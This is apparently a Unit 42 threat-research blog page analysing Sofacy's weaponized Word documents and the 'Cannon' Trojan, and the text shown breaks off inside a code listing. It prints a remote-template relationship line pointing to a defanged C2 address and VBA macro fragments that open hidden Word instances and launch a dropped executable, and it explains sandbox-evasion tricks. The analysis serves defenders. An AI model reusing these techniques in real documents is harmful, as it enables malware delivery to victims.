  <body class="post-template-default single single-post postid-94637 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-94637 entry-meta">
			
			
			<span class="post-views-count">27,308</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'94637','like')"><i class="ui ui-2"></i><span class="ml-5">4</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 13</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan%2F+-+Sofacy+Continues+Global+Attacks+and+Wheels+Out+New+%E2%80%98Cannon%E2%80%99+Trojan" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan%2F&title=Sofacy+Continues+Global+Attacks+and+Wheels+Out+New+%E2%80%98Cannon%E2%80%99+Trojan&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a> and <a href="https://unit42.paloaltonetworks.com/author/bryanlee/" title="Posts by Bryan Lee" class="author url fn" rel="author">Bryan Lee</a>        </p>
        <p><time datetime="2018-11-20T04:00:30+00:00">November 20, 2018 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/cannon/" rel="tag">Cannon</a>, <a href="https://unit42.paloaltonetworks.com/tag/sofacy/" rel="tag">Sofacy</a>, <a href="https://unit42.paloaltonetworks.com/tag/zebrocy/" rel="tag">Zebrocy</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="600" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg 600w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300-300x150.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300-370x185.jpg 370w" sizes="(max-width: 600px) 100vw, 600px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>In late October and early November 2018, Unit 42 intercepted a series of weaponized documents that use a technique to load remote templates containing a malicious macro. These types of weaponized documents are not uncommon but are more difficult to identify as malicious by automated analysis systems due to their modular nature. Specific to this technique, if the C2 server is not available at the time of execution, the malicious code cannot be retrieved, rendering the delivery document largely benign.</p>
<p>The weaponized documents targeted several government entities around the globe, including North America, Europe, and a former USSR state. Fortunately for us, the C2 servers for several of these documents were still operational allowing for retrieval of the malicious macro and the subsequent payloads. Analysis revealed a consistent first-stage payload of the well-documented <a href="https://researchcenter.paloaltonetworks.com/tag/Zebrocy/">Zebrocy </a>Trojan. Additional collection of related documents revealed a second first-stage payload that we have named ‘Cannon’. Cannon has not been previously observed in use by the Sofacy group and contains a novel email-based C2 communication channel. Email as a C2 channel is not a new tactic, but it is generally not observed in the wild as often as HTTP or HTTPS. Using email as a C2 channel may also decrease the chance of detection, as sending email via non-sanctioned email providers may not necessarily construe suspicious or even malicious activity in many enterprises.</p>
<p>The activity discussed in this blog revolves around two of the multitude of weaponized documents that we collected. These two documents shared multiple data artifacts, such as a shared C2 IP, shared author name, and shared tactics. Details of the extended attack campaign associated with the Cannon Trojan will be discussed in a later blog. A particularly interesting aspect of one of the two documents we analyzed was the filename used, <span style="font-family: 'courier new', courier, monospace;">crash list(Lion Air Boeing 737).docx</span>. This is not the first instance of an adversary group using recent current events as a lure, but it is interesting to see this group attempt to capitalize on the attention of a catastrophic event to execute their attack.</p>
<p>&nbsp;</p>
<p><span style="font-size: 18pt;">Attack Details</span></p>
<p>The initial sample we intercepted was a Microsoft Word document (SHA256: <span style="font-family: 'courier new', courier, monospace;">2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f</span>) with the filename <span style="font-family: 'courier new', courier, monospace;">crash list(Lion Air Boeing 737).docx</span> using the author name <span style="font-family: 'courier new', courier, monospace;">Joohn</span>. This document appeared to be targeting a government organization dealing with foreign affairs in Europe via spear-phishing. Once the user attempts to open the document, Microsoft Word immediately attempts to load the remote template containing a malicious macro and payload from the location specified within the <span style="font-family: 'courier new', courier, monospace;">settings.xml.rels</span> file of the DOCX document, as seen here:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694d1166c38621234041" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="hxxp://188.241.58[.]170/live/owa/office.dotm" TargetMode="External"/&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694d1166c38621234041-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694d1166c38621234041-1"><span class="crayon-o">&lt;</span><span class="crayon-e">Relationship </span><span class="crayon-v">Id</span><span class="crayon-o">=</span><span class="crayon-s">"rId1"</span><span class="crayon-h"> </span><span class="crayon-v">Type</span><span class="crayon-o">=</span><span class="crayon-s">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span><span class="crayon-h"> </span><span class="crayon-v">Target</span><span class="crayon-o">=</span><span class="crayon-s">"hxxp://188.241.58[.]170/live/owa/office.dotm"</span><span class="crayon-h"> </span><span class="crayon-v">TargetMode</span><span class="crayon-o">=</span><span class="crayon-s">"External"</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>If the C2 has already been taken offline the document will still open, but Word will be unable to retrieve the remote template and thus Word will not load a macro. In this situation, Word will present the same lure document to the victim as seen in Figure 2, but without the ability to enable macros via an <span style="font-family: 'courier new', courier, monospace;">Enable Content</span> button. Assuming the C2 is still operational however, Word loads the remote template (SHA256: <span style="font-family: 'courier new', courier, monospace;">f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5</span>) and the user is presented with the screen as seen in Figure 1.</p>
<p><img class="aligncenter wp-image-94653" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/11/canon_1.png" alt="" width="600" height="417" /></p>
<p style="text-align: center;"><em>Figure 1 Lure screen</em></p>
<p>&nbsp;</p>
<p>Once the victim presses the Enable content button, the embedded macro is executed. The macros used for these delivery documents use a less common method of using the <span style="font-family: 'courier new', courier, monospace;">AutoClose</span> function. This is a form of anti-analysis as Word will not fully execute the malicious code until the user closes the document. If an automated sandbox exits its analysis session without specifically closing out the document, the sandbox may miss the malicious activity entirely. Once successfully executed, the macro will install a payload and save a document to the system. Typically, we expect to see a decoy document saved to the system and later displayed to make the victim less suspicious of malicious activity; however, in this case the document saved to the system was never displayed and does not contain any pertinent content to the Lion Air tragedy theme seen in the filename. The macro obtains the document saved to the system from within the document stored as <span style="font-family: 'courier new', courier, monospace;">UserForm1.Label1.Caption</span> and will write it to:</p>
<p><span style="font-family: 'courier new', courier, monospace;">%TEMP%\~temp.docm</span></p>
<p>The macro obtains the payload saved to the system from within the document stored as <span style="font-family: 'courier new', courier, monospace;">UserForm1.Label2.Caption</span> and will write it to:</p>
<p><span style="font-family: 'courier new', courier, monospace;">%APPDATA%\MSDN\~msdn.exe</span></p>
<p>The macro executes this payload in a rather interesting way by loading the dropped <span style="font-family: 'courier new', courier, monospace;">~temp.docm</span> document and calling a function within its embedded macro to run the payload. We believe the creator of this delivery document chose to run the payload from the dropped file as an evasion technique. Also, the fact the initial macro uses this dropped document for the execution of the payload may also explain why the document did not contain any decoy contents.</p>
<p>To carry out this functionality, after writing the  <span style="font-family: 'courier new', courier, monospace;">~temp.docm</span> and <span style="font-family: 'courier new', courier, monospace;">~msdn.exe</span> files to the system, the initial macro will load the <span style="font-family: 'courier new', courier, monospace;">~temp.docm</span> file as a Word Document object and attempts to run the function <span style="font-family: 'courier new', courier, monospace;">Proc1</span> in the <span style="font-family: 'courier new', courier, monospace;">Module1</span> macro within the <span style="font-family: 'courier new', courier, monospace;">~temp.docm</span> file, as seen in the following code snippet:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694d1166c42322480761" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Set WA = CreateObject("Word.Application")
WA.Visible = False
Set oMyDoc = WA.Documents.Open(vF)
WA.Application.Run "Module1.Proc1"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694d1166c42322480761-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694d1166c42322480761-2">2</div><div class="crayon-num" data-line="crayon-5f694d1166c42322480761-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694d1166c42322480761-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694d1166c42322480761-1"><span class="crayon-e">Set </span><span class="crayon-v">WA</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Word.Application"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694d1166c42322480761-2"><span class="crayon-v">WA</span><span class="crayon-sy">.</span><span class="crayon-v">Visible</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">False</span></div><div class="crayon-line" id="crayon-5f694d1166c42322480761-3"><span class="crayon-e">Set </span><span class="crayon-v">oMyDoc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">WA</span><span class="crayon-sy">.</span><span class="crayon-v">Documents</span><span class="crayon-sy">.</span><span class="crayon-e">Open</span><span class="crayon-sy">(</span><span class="crayon-v">vF</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694d1166c42322480761-4"><span class="crayon-v">WA</span><span class="crayon-sy">.</span><span class="crayon-v">Application</span><span class="crayon-sy">.</span><span class="crayon-i">Run</span><span class="crayon-h"> </span><span class="crayon-s">"Module1.Proc1"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The <span style="font-family: 'courier new', courier, monospace;">Proc1</span> function within the <span style="font-family: 'courier new', courier, monospace;">Module1</span> does nothing more than build the <span style="font-family: 'courier new', courier, monospace;">%APPDATA%\MSDN\~msdn.exe</span> path to the dropped payload and executes it using the built-in <span style="font-family: 'courier new', courier, monospace;">Shell</span> function, as seen in the following code snippet:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694d1166c44595701319" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
vAdd = "~msdn"
vFileName = Environ("APPDATA") &amp; "\MSDN\" 
vFileName = vFileName + vAdd &amp; ".e" + "x" &amp; "e"
Shell vFileName </textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694d1166c44595701319-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694d1166c44595701319-2">2</div><div class="crayon-num" data-line="crayon-5f694d1166c44595701319-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694d1166c44595701319-4">4</div></div>
				</td>
